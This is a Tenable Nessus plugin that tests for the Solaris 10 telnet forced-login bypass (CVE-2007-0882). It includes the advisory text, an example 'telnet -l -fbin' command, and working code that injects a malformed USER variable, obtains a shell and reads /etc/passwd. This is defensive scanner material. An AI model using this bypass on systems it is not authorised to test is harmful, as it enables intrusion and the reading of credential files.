#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(24323);
  script_version("$Revision: 1.27 $");
  script_cve_id("CVE-2007-0882");
  script_bugtraq_id(22512);
  script_osvdb_id(31881);
  script_xref(name:"IAVB", value:"2007-B-0006");

  script_name(english:"Solaris 10 Forced Login Telnet Authentication Bypass");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to log into the remote system using telnet without
supplying any credentials" );
 script_set_attribute(attribute:"description", value:
"The remote version of telnet does not sanitize the user-supplied
'USER' environment variable.  By supplying a specially malformed USER
environment variable, an attacker may force the remote telnet server
to believe that the user has already authenticated. 

For instance, the following command :

	telnet -l '-fbin' target.example.com 

will result in obtaining a shell with the privileges of the 'bin'
user." );
 script_set_attribute(attribute:"solution", value:
"Install patches 120068-02 (sparc) or 120069-02 (i386),
which are available from Sun.

Filter incoming to this port or disable the telnet service 
and use SSH instead, or use inetadm to mitigate this 
problem (see the link below)." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'Sun Solaris Telnet Remote Authentication Bypass Vulnerability');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'CANVAS');
 script_cwe_id(94);
 script_set_attribute(attribute:"see_also", value:"http://lists.sans.org/pipermail/list/2007-February/025935.html" );
 script_set_attribute(attribute:"see_also", value:"http://isc.sans.org/diary.html?storyid=2220" );
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/02/12");
 script_set_attribute(attribute:"patch_publication_date", value: "2007/02/13");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/02/10");
 script_cvs_date("$Date: 2016/12/09 21:04:55 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"stig_severity", value:"I");
script_set_attribute(attribute:"cpe", value:"cpe:/o:sun:solaris");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_summary(english:"Attempts to log in as -fbin");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");
  script_family(english:"Gain a shell remotely");
  script_dependencie("find_service1.nasl", "openwrt_blank_telnet_password.nasl");
  script_exclude_keys("openwrt/blank_telnet_password");
  script_require_ports("Services/telnet", 23);
  exit(0);
}


if (get_kb_item("openwrt/blank_telnet_password")) exit(0, "Ignoring host with an unpassworded OpenWrt Telnet service.");

OPT_WILL        = 0xfb;
OPT_WONT        = 0xfc;
OPT_DO          = 0xfd;
OPT_DONT        = 0xfe;

OPT_SUBOPT      = 0xfa;
OPT_ENDSUBOPT   = 0xf0;

OPT_ENV		= 0x27;

port = get_kb_item("Services/telnet");
if(!port) port = 23;
if(!get_port_state(port))exit(0);


soc = open_sock_tcp(port);
if ( ! soc ) exit(0);

send(socket:soc, data:raw_string(0xff, OPT_WILL, OPT_ENV));

timeout = 5;

while ( TRUE )
{
 counter ++;
 if ( counter > 200 ) break;
 s = recv(socket:soc, length:1, timeout:timeout);
 timeout = 5;
 if ( strlen(s) == 0 ) break; # End of options ?
 if ( ord(s[0]) != 0xff )
	 break;

  else {
	 s = recv(socket:soc, length:2);
	 if ( strlen(s) != 2 ) break;
  	 if ( ord(s[0]) == OPT_DO && ord(s[1]) == OPT_ENV )
	 {
	  send(socket:soc, data:raw_string(0xff, OPT_SUBOPT, OPT_ENV) + raw_string(0,0) + 'USER' + raw_string(1) + '-fbin' + raw_string(0xff, OPT_ENDSUBOPT));
	 }
	 else if ( ord(s[0]) == OPT_DO && ord(s[1]) != OPT_ENV ) send(socket:soc, data:raw_string(0xff, OPT_WONT) + s[1]);
  	 else if ( ord(s[0]) == OPT_WILL ) send(socket:soc, data:raw_string(0xff, OPT_DONT) + s[1]);
 	 else if ( ord(s[0]) == OPT_SUBOPT )
	 {
	  prev = recv(socket:soc, length:1);
          counter2 = 0;
          while ( strlen(prev) && ord(prev[0]) != 0xff && ord(s[0]) != OPT_ENDSUBOPT )
           {
            prev = s;
            # No timeout - the answer is supposed to be cached
            s    = recv(socket:soc, length:1, timeout:0);
            if ( ! strlen(s) ) exit(0);
            counter2++;
            if ( counter2 >= 100 ) exit(0);
	  }
	 }
  	}
}

r = recv(socket:soc, length:4096);
send(socket:soc, data:'id\r\n');
r = recv(socket:soc, length:4096, min:4096);
if ( (uid = egrep(pattern:"uid=", string:r))  )
{
 send(socket:soc, data:'cat /etc/passwd\r\n');
 passwd = recv(socket:soc, length:65535, min:65535);
 report = 'It was possible to log into the remote host as \'bin\' :\n' + uid + '\nThe file /etc/passwd contains :\n\n' + passwd;
 security_hole(port:port, extra:report);
} 
